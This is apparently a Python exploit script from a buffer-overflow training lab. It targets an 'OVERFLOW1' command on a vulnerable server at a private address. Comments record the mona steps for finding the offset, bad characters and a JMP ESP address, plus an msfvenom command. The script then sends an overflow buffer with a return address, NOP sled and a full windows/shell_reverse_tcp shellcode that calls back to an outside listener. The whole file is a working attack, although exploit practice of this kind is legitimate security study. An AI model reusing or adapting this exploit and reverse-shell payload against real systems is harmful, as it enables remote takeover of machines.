import socket

ip = "10.10.9.32"
port = 1337
# crash 1978, 0x6f43396e
# !mona findmsp -distance 2000
# bad chars \x00\x07\x2e\xa0
# !mona bytearray -b "\x00"
# !mona compare -f C:\mona\oscp\bytearray.bin -a 01ABFA30
# jmp esp !mona jmp -r esp -cpb "\x00", AF115062
# 1978 + 4 + 351
# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.148 LPORT=80 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xdd\xc0\xd9\x74\x24\xf4\x5f\x31\xc9\xbd\x2b\x24\x9d\xc1\xb1"
"\x52\x83\xef\xfc\x31\x6f\x13\x03\x44\x37\x7f\x34\x66\xdf\xfd"
"\xb7\x96\x20\x62\x31\x73\x11\xa2\x25\xf0\x02\x12\x2d\x54\xaf"
"\xd9\x63\x4c\x24\xaf\xab\x63\x8d\x1a\x8a\x4a\x0e\x36\xee\xcd"
"\x8c\x45\x23\x2d\xac\x85\x36\x2c\xe9\xf8\xbb\x7c\xa2\x77\x69"
"\x90\xc7\xc2\xb2\x1b\x9b\xc3\xb2\xf8\x6c\xe5\x93\xaf\xe7\xbc"
"\x33\x4e\x2b\xb5\x7d\x48\x28\xf0\x34\xe3\x9a\x8e\xc6\x25\xd3"
"\x6f\x64\x08\xdb\x9d\x74\x4d\xdc\x7d\x03\xa7\x1e\x03\x14\x7c"
"\x5c\xdf\x91\x66\xc6\x94\x02\x42\xf6\x79\xd4\x01\xf4\x36\x92"
"\x4d\x19\xc8\x77\xe6\x25\x41\x76\x28\xac\x11\x5d\xec\xf4\xc2"
"\xfc\xb5\x50\xa4\x01\xa5\x3a\x19\xa4\xae\xd7\x4e\xd5\xed\xbf"
"\xa3\xd4\x0d\x40\xac\x6f\x7e\x72\x73\xc4\xe8\x3e\xfc\xc2\xef"
"\x41\xd7\xb3\x7f\xbc\xd8\xc3\x56\x7b\x8c\x93\xc0\xaa\xad\x7f"
"\x10\x52\x78\x2f\x40\xfc\xd3\x90\x30\xbc\x83\x78\x5a\x33\xfb"
"\x99\x65\x99\x94\x30\x9c\x4a\x91\xcd\x9d\x1e\xcd\xcf\xa1\x1e"
"\x5e\x59\x47\x74\x4e\x0f\xd0\xe1\xf7\x0a\xaa\x90\xf8\x80\xd7"
"\x93\x73\x27\x28\x5d\x74\x42\x3a\x0a\x74\x19\x60\x9d\x8b\xb7"
"\x0c\x41\x19\x5c\xcc\x0c\x02\xcb\x9b\x59\xf4\x02\x49\x74\xaf"
"\xbc\x6f\x85\x29\x86\x2b\x52\x8a\x09\xb2\x17\xb6\x2d\xa4\xe1"
"\x37\x6a\x90\xbd\x61\x24\x4e\x78\xd8\x86\x38\xd2\xb7\x40\xac"
"\xa3\xfb\x52\xaa\xab\xd1\x24\x52\x1d\x8c\x70\x6d\x92\x58\x75"
"\x16\xce\xf8\x7a\xcd\x4a\x18\x99\xc7\xa6\xb1\x04\x82\x0a\xdc"
"\xb6\x79\x48\xd9\x34\x8b\x31\x1e\x24\xfe\x34\x5a\xe2\x13\x45"
"\xf3\x87\x13\xfa\xf4\x8d")

buffer = prefix + overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")